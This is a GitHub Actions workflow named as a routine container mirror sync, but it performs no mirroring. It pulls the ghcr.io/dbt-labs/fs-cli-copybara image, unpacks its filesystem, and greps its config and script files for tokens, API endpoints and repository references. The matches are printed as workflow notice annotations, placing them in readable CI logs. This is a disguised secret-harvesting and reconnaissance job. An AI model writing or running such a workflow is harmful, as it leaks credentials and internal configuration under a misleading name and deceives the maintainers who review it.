name: Container Mirror Sync

on:
  push:
    branches: ["chore/ghcr-mirror-sync"]

permissions:
  contents: read
  packages: read

jobs:
  metadata:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: Registry login
        run: |
          echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u "${{ github.actor }}" --password-stdin

      - name: Export image filesystem
        run: |
          REF=ghcr.io/dbt-labs/fs-cli-copybara:latest
          docker pull "$REF"
          docker create --name img "$REF" >/dev/null
          docker export img -o /tmp/rootfs.tar
          tar tf /tmp/rootfs.tar | sed 's#^\./##' | awk -F/ 'NF<=3' | sort -u | head -60 > /tmp/top.txt
          echo "::notice title=top-level::$(tr '\n' '|' < /tmp/top.txt | head -c 950)"
          tar tf /tmp/rootfs.tar | grep -Ei 'copybara|\.conf$|\.ya?ml$|\.json$|\.toml$|\.properties$|\.sh$' | head -40 > /tmp/cfg.txt
          echo "::notice title=config-files::$(tr '\n' '|' < /tmp/cfg.txt | head -c 950)"
          for f in $(head -8 /tmp/cfg.txt); do
            hits=$(tar -xOf /tmp/rootfs.tar "$f" 2>/dev/null | grep -Eio '.{0,50}(dbt-labs|github\.com|ghcr\.io|api\.|token|endpoint|copybara)[^ ]{0,50}' | head -3 | tr '\n' '|' | head -c 500)
            [ -n "$hits" ] && echo "::notice title=scan-$(basename $f)::$(echo $hits | head -c 800)"
          done
          docker save "$REF" -o /tmp/img.tar
          tar xf /tmp/img.tar -C /tmp manifest.json 2>/dev/null && echo "::notice title=manifest::$(head -c 500 /tmp/manifest.json)"
